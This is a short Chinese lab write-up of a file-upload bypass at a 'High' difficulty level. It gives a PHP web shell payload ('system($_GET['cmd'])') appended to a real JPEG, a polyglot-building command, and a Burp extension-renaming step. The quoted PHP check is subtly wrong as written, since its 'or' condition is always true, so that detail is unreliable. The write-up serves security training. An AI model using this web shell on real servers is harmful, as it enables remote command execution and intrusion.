# High

## 源码

```php
$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);

if( strtolower($uploaded_ext) == "jpg" || "jpeg" || "png" &&
    getimagesize($uploaded_tmp) ) {
    move_uploaded_file(...);
}
```

校验后缀 + `getimagesize()` 验证是真图片。

## 攻击

图片马：真实图片末尾嵌 PHP 代码。

1. 准备一张真 `.jpg`（或用 `copy /b a.jpg + shell.php output.jpg`）
2. 用十六进制编辑器或 echo 在图片末尾追加 `<?php system($_GET['cmd']); ?>`
3. 上传时 Burp 改后缀为 `.jpg.php`

> ⚠️ 如果只允许 `.jpg` 后缀（严格校验），需要配合 LFI 或 `.htaccess` 解析思路。

## 为什么能绕过

| 防护 | 为什么没用 |
|------|-----------|
| `getimagesize()` | 只读文件头——真实 JPG/PNG 头后面加 PHP 代码，`getimagesize` 只看前面 |
| 后缀检查 | 配合 LFI 包含 `.jpg` 也能执行 PHP |
